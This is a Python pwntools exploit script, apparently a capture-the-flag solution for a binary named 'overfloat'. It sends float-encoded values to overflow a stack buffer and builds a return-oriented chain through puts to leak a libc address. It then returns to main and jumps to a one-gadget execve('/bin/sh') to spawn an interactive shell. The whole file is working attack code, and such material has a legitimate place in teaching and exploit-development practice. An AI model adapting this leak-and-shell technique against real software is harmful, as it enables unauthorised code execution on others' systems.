from pwn import *
import struct

binary = context.binary = ELF("./overfloat")
libc = ELF("./libc-2.27.so")

puts_got  = 0x602020
puts_plt  = 0x400690
# pop rdi; ret
pop_rdi   = 0x400a83
main_addr = 0x400993

# 0x20a38c (execve(/bin/sh)) - 0x1809c0 (puts) = 0x899cc (offset)
offset   = 0x899cc

if args.GDB:
    p = gdb.debug(binary.path, env={"LD_PRELOAD":libc.path}, gdbscript="""b *chart_course
b *chart_course+0x13d""")
else:
    p = process(binary.path, env={"LD_PRELOAD":libc.path})

# Fill to ret
def fill_to_ret():
    buf = str(struct.unpack("f", b"AAAA")[0])
    for _ in range(14):
        p.sendline(buf)

def send_addr(line):
    for s in [line[i:i+4] for i in range(0, len(line), 4)]:
        tmp = str(struct.unpack("f", s)[0])
        p.sendline(tmp)

fill_to_ret()

# call puts on puts
send_addr(pop_rdi.to_bytes(8, "little"))
send_addr(puts_got.to_bytes(8, "little"))
send_addr(puts_plt.to_bytes(8, "little"))

# return to main
send_addr(main_addr.to_bytes(8, "little"))
p.sendline(b"done")

# Get address of puts in libc
puts_addr = p.recvuntil(b"WHERE WOULD YOU LIKE TO GO?")
puts_addr = p.recvuntil(b"\n                                 _ .--.        \n")
puts_addr = puts_addr.split(b"BON VOYAGE!\n")[1].split(b"\n                                 _ .--.        \n")[0]
puts_addr = u64(puts_addr + b"\x00" * (8 - len(puts_addr)))
exec_addr = puts_addr + offset

fill_to_ret()

# call execve one shot
send_addr(exec_addr.to_bytes(8, "little"))
p.sendline(b"done")

p.interactive()